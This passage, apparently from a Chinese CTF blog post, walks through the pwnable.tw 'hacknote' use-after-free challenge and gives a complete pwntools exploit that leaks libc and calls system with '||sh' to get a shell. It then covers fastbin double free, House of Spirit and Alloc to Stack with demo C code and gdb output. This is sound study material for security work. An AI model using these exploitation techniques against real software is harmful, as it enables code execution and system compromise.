class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>    <span class="hljs-comment">//&amp;ptr + v1是函数指针的地址,解引用后得到改地址上的函数指针, 前面的是函数头</span><br>    <span class="hljs-comment">//就是调用存在改地址的put函数</span><br>    (*(<span class="hljs-keyword">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1)) (*(&amp;ptr + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p class="note note-info"><strong>UAF--use after free</strong>, 要在free后再次使用一般是在free后指针并未设置为NULL. 这是UAF一个很明显的标志</p> </li><li><p>这里的delete函数中就没有在free后面设置NULL, 我们可以利用fastbin链的特性，来使一个可修改的指针指向某个被释放的note的func成员指针，进而修改该指针并执行其指向的函数</p></li><li><p>过程分析:</p><ol><li>我们可以先声明两个note，分别称为note0、note1，注意这两个note的content size必须&gt;12， 这样content chunk<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="与上条类似，我们同样将分配作为content的chunk称为content chunk">[1]</span></a></sup>的大小就会 <strong>大于</strong> note chunk<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="为了方便，我们将分配作为note的chunk称为note chunk">[2]</span></a></sup>的大小 . <u>此时note chunk的user size为(8+4)bytes, content chunk的user size为(申请的大小+4)</u> </li></ol><div class="hljs code-wrapper"><pre><code>如此，当这两个note都被释放时，两个note的note chunk会放置进相同索引的fast bin链里，而另外两个content chunk则会放置进 **另一个索引** 的fast bin链里。 note chunk 和 content chunk 在fast bin链中互不干扰</code></pre></div><ol start="2"><li>q第二步就是新建一个新的note2，注意该note的content size要&lt;=12分配到<strong>fastbin上note1</strong>的空间，成为note2的content chunk</li><li><strong>注意</strong>：当程序可以执行system函数时，注意传入的地址为note2的地址，所以<code>[system addr]</code> 以及其后4个字节都会被解释成字符串尝试执行。但[system addr]又必须保留，那该如何get shell呢？<br> 这里有个小技巧，我们可以在最后四个字节构造<code>&quot;||sh&quot;</code>。这样便会执行<code>system(&quot;[system addr]||sh&quot;)</code><br> 由于<code>[system addr]</code>肯定执行失败，所以便会执行到后面的<code>sh</code>。这样便可以get shell</li></ol></li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><p>新建note0、note1，其note size必须大于12</p></li><li><p>释放note0、note1</p></li><li><p>新建note2，其note size必须&lt;=12。</p><p>此时note2-&gt;content指针就会指向note1，在新建的过程中，便可修改内存上的内存。</p><ul><li>修改note1-&gt;func为puts()函数（func指针默认设置的函数)</li><li>修改note1-&gt;content为<code>got@__libc_start_main</code>（随便哪个已经延迟绑定过的函数都行）</li></ul></li><li><p>输出note1的内容（print note1），从而泄露libc基地址，进而确定<code>system</code>函数的地址</p></li><li><p>释放note2并重新建立note2，其note size仍然必须&lt;=12</p><p>在建立note2过程中，修改以下内容</p><ul><li>修改note1-&gt;func为<code>system</code>函数</li><li>修改note1-&gt;content为<code>&quot;||sh&quot;</code>字符串</li></ul></li><li><p>输出note1的内容（print note1） 执行system(“sh”)， get shell！</p></li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br>context(terminal=[<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>], os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span>(<span class="hljs-params"><span class="hljs-built_in">len</span>, content</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Note size :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>))<br>    io.sendlineafter(<span class="hljs-string">&quot;Content :&quot;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># 新建note0和note1并删除，注意删除顺序</span><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>delnote(<span class="hljs-number">1</span>)<br>delnote(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 新建note2，写入数据并执行</span><br>addnote(<span class="hljs-number">8</span>, flat(<span class="hljs-number">0x0804862B</span>, e.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br>printnote(<span class="hljs-number">1</span>)<br> <span class="hljs-comment"># 上一步泄露出了libc地址，处理得到system函数地址</span><br>libc_read_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;libc read addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_read_addr))<br><span class="hljs-comment"># 删除note2</span><br>delnote(<span class="hljs-number">2</span>)<br><br>libcbase_addr = libc_read_addr - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system_addr = libcbase_addr + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-string">&#x27;libcbase addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase_addr))<br>log.success(<span class="hljs-string">&#x27;system addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># 重新建立note2，写入system地址和&#x27;||sh&#x27;字符串，执行函数</span><br>addnote(<span class="hljs-number">8</span>, flat(system_addr, <span class="hljs-string">&#x27;||sh&#x27;</span>)) <span class="hljs-comment"># 8或者12都是可以的</span><br><br>printnote(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># get shell！</span><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>几乎全为<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">CTF-WiKi</a>, 做了些修改以及添加了一点个人想法</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>如果细分的话，可以做如下的分类：</p><ul><li><strong>Fastbin Double Free</strong> </li><li><strong>House of Spirit</strong> </li><li><strong>Alloc to Stack</strong> </li><li><strong>Arbitrary Alloc</strong> </li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 <strong>pre_inuse</strong> 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 <strong>main_arena</strong> 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-keyword">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>这里就直接以 how2heap 上的例子进行说明，如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;<br>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">7</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行后的效果如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">➜  how2heap git:(master) ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling malloc() once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.<br>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.<br>... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.<br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!<br>malloc(0x30): 0x7ffd9bceaa60<br></code></pre></div></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。还能怎样绕过呢? 暂时只知道上面的方法, 有待补充.</p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>前文所讲的 Fastbin Double Free 与 house of spirit 技术和本节所讲的Alloc to Stack，它们的本质都在于 fastbin 链表的特性：<strong>当前 chunk 的 fd 指针指向下一个 chunk。</strong> </p><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//0x10是user date, chunk1指向的是fd指针</span><br><br>    <span class="hljs-built_in">free</span>(chunk1); <span class="hljs-comment">//free chunk1之后fastbin中只有这一个chunk, fd指向NULL, </span><br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=&amp;stack_chunk; <span class="hljs-comment">//修改为8字节的指针, 将fd指针赋值为stack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//将chunk1取出</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//malloc出了一个fack_chunk(stack_chunk), 这样我们就可以修改栈上的数据了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1<br>0x602010:   0x00007fffffffde60  0x0000000000000000<br>0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk<br></code></pre></div></td></tr></table></figure><p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin<br>0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]<br>0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000<br></code></pre></div></td></tr></table></figure><p>最终第二次 malloc 返回值为 0x00007fffffffde70 也就是 stack_chunk</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;<br> → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax<br><span class="hljs-meta">   $</span><span class="bash">rax   : 0x00007fffffffde70</span><br><br>0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst<br>0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst<br>0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst<br>0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]<br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x 